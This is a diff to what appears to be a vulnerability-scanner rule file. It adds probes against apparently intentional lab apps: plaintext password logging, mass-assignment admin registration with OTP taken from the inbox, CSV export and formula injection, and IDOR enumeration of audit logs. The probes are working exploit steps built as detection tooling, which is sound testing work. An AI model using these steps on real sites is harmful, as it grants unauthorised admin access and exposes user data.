@@ -31366,6 +31366,175 @@ async function pwnshopFreshOtpSessionWithUsername(
   return null;
 }
 
+const PWNSHOP_PLAINTEXT_PASSWORD_CANARY_PREFIX = "ThugirPwCanary_";
+
+const pwnshopAuditLogPlaintextPasswordLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const canaryPassword = `${PWNSHOP_PLAINTEXT_PASSWORD_CANARY_PREFIX}${Date.now().toString(36)}`;
+  const username = `thugir_pwlog_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const loginUrl = new URL("/login", ctx.origin).toString();
+  await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(canaryPassword)}`,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  const eventsUrl = new URL("/api/v1/events", ctx.origin).toString();
+  const eventsDoc = await fetchDoc(eventsUrl, { maxBytes: 16384, timeoutMs: 15000 });
+  if (eventsDoc.status < 200 || eventsDoc.status >= 300) return NEGATIVE;
+  const detailRe = new RegExp(
+    `"detail"\\s*:\\s*"[^"]*password:\\s*${canaryPassword.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}"`,
+    "i"
+  );
+  if (!detailRe.test(eventsDoc.body)) return NEGATIVE;
+  const detailMatch = eventsDoc.body.match(detailRe);
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      loginUrl,
+      eventsUrl,
+      username,
+      snippet: detailMatch?.[0]?.slice(0, 200) ?? eventsDoc.body.slice(0, 200),
+      note: "Pwnshop POST /login writes submitted passwords in plaintext to the unauthenticated /api/v1/events audit log detail field — plaintext password logging oracle (PWN-027)"
+    }
+  };
+};
+
+const pwnshopAuditLogPlaintextPasswordRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/logs\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await pwnshopAuditLogPlaintextPasswordLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Pwnshop /logs route scan — failed login passwords appear in plaintext on unauthenticated /api/v1/events audit log (PWN-027)"
+    }
+  };
+};
+
+async function pwnshopFreshMassAssignmentAdminOtpSession(
+  ctx: RuleContext
+): Promise<{ cookie: string; username: string } | null> {
+  const username = `thugir_adm_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const email = `${username}@probe.local`;
+  const registerDoc = await fetchDoc(new URL("/register", ctx.origin).toString(), {
+    method: "POST",
+    body: `username=${encodeURIComponent(username)}&email=${encodeURIComponent(email)}&password=ThugirTest123!&is_admin=true&role=admin`,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  let cookie = pwnshopSessionCookieFromDoc(registerDoc);
+  if (!cookie) return null;
+  const loginDoc = await fetchDoc(new URL("/login", ctx.origin).toString(), {
+    method: "POST",
+    body: `username=${encodeURIComponent(username)}&password=ThugirTest123!`,
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: cookie
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  const loginLocation = loginDoc.headers["location"] || "";
+  if (![301, 302, 303, 307, 308].includes(loginDoc.status) || !/verify-otp/i.test(loginLocation)) {
+    return null;
+  }
+  cookie = pwnshopSessionCookieFromDoc(loginDoc) ?? cookie;
+  const OTP_MAIL_WAITS_MS = [1500, 2500, 3500, 4500, 5500, 6500, 7500, 8500];
+  for (let attempt = 0; attempt < OTP_MAIL_WAITS_MS.length; attempt++) {
+    await pwnshopSleep(OTP_MAIL_WAITS_MS[attempt]);
+    const inboxToken = await pwnshopMailInboxToken(ctx, cookie);
+    if (!inboxToken) continue;
+    const otp = await pwnshopOtpFromMailInbox(ctx, cookie, inboxToken);
+    if (!otp) continue;
+    const verifyDoc = await fetchDoc(new URL("/verify-otp", ctx.origin).toString(), {
+      method: "POST",
+      body: `otp=${otp}`,
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        Cookie: cookie
+      },
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      redirect: "manual"
+    });
+    if (![301, 302, 303, 307, 308].includes(verifyDoc.status)) continue;
+    const verifyLocation = verifyDoc.headers["location"] || "";
+    if (!verifyLocation || /verify-otp/i.test(verifyLocation)) continue;
+    cookie = pwnshopSessionCookieFromDoc(verifyDoc) ?? cookie;
+    return { cookie, username };
+  }
+  return null;
+}
+
+async function probePwnshopExportOrdersCsv(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isPwnshopHost(ctx)) return null;
+  const session = await pwnshopFreshMassAssignmentAdminOtpSession(ctx);
+  if (!session) return null;
+  const exportUrl = new URL("/admin/export-orders", ctx.origin).toString();
+  const exportDoc = await fetchDoc(exportUrl, {
+    headers: { Cookie: session.cookie },
+    maxBytes: 65536,
+    timeoutMs: 20000,
+    redirect: "manual"
+  });
+  if (exportDoc.status < 200 || exportDoc.status >= 300) return null;
+  const contentType = exportDoc.headers["content-type"] || "";
+  if (!/text\/csv/i.test(contentType) && !/^Order ID,/i.test(exportDoc.body.trim())) return null;
+  if (!/^Order ID,/i.test(exportDoc.body.trim())) return null;
+  const rowCount = exportDoc.body.trim().split(/\r?\n/).length - 1;
+  if (rowCount < 1) return null;
+  const formulaField =
+    exportDoc.body.match(/,("[^"]*=[^"]*"|[^,\n]*=[^,\n]*)/)?.[0]?.slice(-80) ?? null;
+  return {
+    fired: true,
+    confidence: formulaField ? 0.94 : 0.92,
+    evidence: {
+      exportUrl,
+      adminUser: session.username,
+      contentType,
+      rowCount,
+      snippet: exportDoc.body.slice(0, 240).trim(),
+      formulaSnippet: formulaField,
+      note: formulaField
+        ? "Pwnshop GET /admin/export-orders returns CSV with unescaped spreadsheet formula fields in shipping addresses — CSV formula injection oracle (PWN-013)"
+        : "Pwnshop mass-assignment admin (PWN-021) + OTP session reaches GET /admin/export-orders CSV order export without real admin credentials — CSV export oracle (PWN-013)"
+    }
+  };
+}
+
+const pwnshopExportOrdersCsvLiveOracle: Rule = async (ctx) => {
+  const hit = await probePwnshopExportOrdersCsv(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const pwnshopExportOrdersCsvRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/export-orders\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probePwnshopExportOrdersCsv(ctx);
+  if (!hit?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hit.confidence,
+    evidence: {
+      ...hit.evidence,
+      scannedUrl: pageUrl,
+      note: "Pwnshop /admin/export-orders route scan — mass-assignment admin reaches CSV order export without real admin credentials (PWN-013)"
+    }
+  };
+};
+
 async function probePwnshopAccountDeleteCsrf(ctx: RuleContext): Promise<RuleResult | null> {
   if (!isPwnshopHost(ctx)) return null;
   const session = await pwnshopFreshOtpSessionWithUsername(ctx);
@@ -65509,14 +65678,41 @@ async function probeVaultappAdminAuditLogsIdor(ctx: RuleContext): Promise<RuleRe
     Authorization: `Bearer ${auth.token}`,
     Accept: "application/json"
   };
-  const probeUserId = auth.userId === 299 ? 10 : 299;
+  const auditProbeUserIds = [50, 100, 200, 10, 299];
+  let probeUserId: number | null = null;
+  let probeDoc: { status: number; body: string } | null = null;
+  for (const candidateId of auditProbeUserIds) {
+    if (candidateId === auth.userId) continue;
+    const candidateUrl = new URL("/api/admin/audit-logs", ctx.origin);
+    candidateUrl.searchParams.set("user_id", String(candidateId));
+    const candidateDoc = await ctx.probe.get(candidateUrl.toString(), {
+      headers,
+      maxBytes: 16384,
+      timeoutMs: 20000
+    });
+    if (candidateDoc.status < 200 || candidateDoc.status >= 300) continue;
+    try {
+      const candidateData = JSON.parse(candidateDoc.body) as {
+        user_id?: number;
+        logs?: unknown[];
+      };
+      if (
+        candidateData.user_id === candidateId &&
+        Array.isArray(candidateData.logs) &&
+        candidateData.logs.length >= 1
+      ) {
+        probeUserId = candidateId;
+        probeDoc = candidateDoc;
+        break;
+      }
+    } catch {
+      /* try next user_id */
+    }
+  }
+  if (!probeUserId || !probeDoc) return null;
   const auditUrl = new URL("/api/admin/audit-logs", ctx.origin);
   auditUrl.searchParams.set("user_id", String(probeUserId));
-  const doc = await ctx.probe.get(auditUrl.toString(), {
-    headers,
-    maxBytes: 16384,
-    timeoutMs: 20000
-  });
+  const doc = probeDoc;
   if (doc.status < 200 || doc.status >= 300) return null;
   try {
     const data = JSON.parse(doc.body) as {
@@ -67341,6 +67537,10 @@ export const RULES: Record<string, Rule> = {
   pwnshopWalletTopupRouteLiveOracle,
   pwnshopAccountDeleteCsrfLiveOracle,
   pwnshopAccountDeleteCsrfRouteLiveOracle,
+  pwnshopAuditLogPlaintextPasswordLiveOracle,
+  pwnshopAuditLogPlaintextPasswordRouteLiveOracle,
+  pwnshopExportOrdersCsvLiveOracle,
+  pwnshopExportOrdersCsvRouteLiveOracle,
   fauxbankLoansRouteLiveOracle,
   fauxbankTransferRouteLiveOracle,
   fauxbankAccountsRouteLiveOracle,
